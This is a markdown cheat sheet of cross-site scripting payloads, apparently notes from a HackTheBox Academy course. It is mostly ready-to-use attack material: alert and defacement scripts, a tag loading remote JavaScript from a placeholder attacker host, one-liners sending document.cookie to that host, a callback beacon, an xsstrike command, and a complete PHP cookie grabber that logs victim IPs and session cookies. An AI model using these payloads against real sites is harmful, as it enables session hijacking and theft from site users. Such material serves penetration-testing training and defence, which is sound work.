# security/xss-payloads.md

## Basic XSS payloads
    <script>alert(window.origin)</script>
    <plaintext>
    <script>print()</script>

## HTML-based payloads
    <img src="" onerror=alert(window.origin)>

## DOM manipulation (visual / defacement)
    <script>document.body.style.background = "#141d2b"</script>
    <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
    <script>document.title = 'HackTheBox Academy'</script>
    <script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
    <script>document.getElementById('urlform').remove();</script>

## Load remote JavaScript
    <script src="http://OUR_IP/script.js"></script>

## Cookie exfiltration (JS)
    document.location='http://OUR_IP/index.php?c='+document.cookie;
    new Image().src='http://OUR_IP/index.php?c='+document.cookie;

## Beacon / callback check (request to you)
    <img src="http://OUR_IP:PORT"</img>

## Common DOM sinks (write-to-DOM)
    document.write()
    DOM.innerHTML
    DOM.outerHTML

## jQuery sinks (write-to-DOM)
    add()
    after()
    append()

## Tooling

### Run xsstrike against a URL parameter
    python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"

### Host a PHP server (for script.js / cookie grabber)
    sudo php -S 0.0.0.0:80

## Cookie grabber (PHP)
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
